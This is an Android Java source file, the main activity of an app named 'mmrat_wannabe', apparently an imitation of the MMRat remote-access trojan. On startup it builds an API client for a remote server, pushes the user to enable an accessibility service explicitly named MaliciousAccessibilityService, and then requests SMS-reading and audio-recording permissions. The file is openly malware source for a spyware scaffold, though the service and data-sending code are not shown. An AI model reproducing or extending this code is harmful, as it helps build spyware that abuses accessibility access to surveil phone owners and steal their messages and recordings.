package com.example.mmrat_wannabe;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Bundle;

import com.example.mmrat_wannabe.retrofit.ApiService;
import com.example.mmrat_wannabe.retrofit.RetrofitClient;
import com.example.mmrat_wannabe.services.MaliciousAccessibilityService;

import android.Manifest;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;

import static com.example.mmrat_wannabe.Config.apiService;
import static com.example.mmrat_wannabe.Config.context;

import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_ACCESSIBILITY = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init();

        startServices();
    }

    private void init(){
        context = this;
        apiService = RetrofitClient.getRetrofitInstance(this).create(ApiService.class);
    }

    private void requestPermissions(){
        int ALL_PERMISSIONS = 101;
        final String[] permissions = new String[] {
                Manifest.permission.READ_SMS,
                Manifest.permission.RECORD_AUDIO
        };
        ActivityCompat.requestPermissions(this, permissions, ALL_PERMISSIONS);
    }

    private void startServices() {
        System.out.println("Starting services..");

        if(!isAccessibilityServiceEnabled(this,MaliciousAccessibilityService.class)){
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, REQUEST_ACCESSIBILITY);
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_ACCESSIBILITY) {
            // Accessibility settings screen was closed, now request permissions
            requestPermissions();
        }
    }

    // Check if an Accessibility Service is enabled
    public boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;
        }
        return false;
    }
}
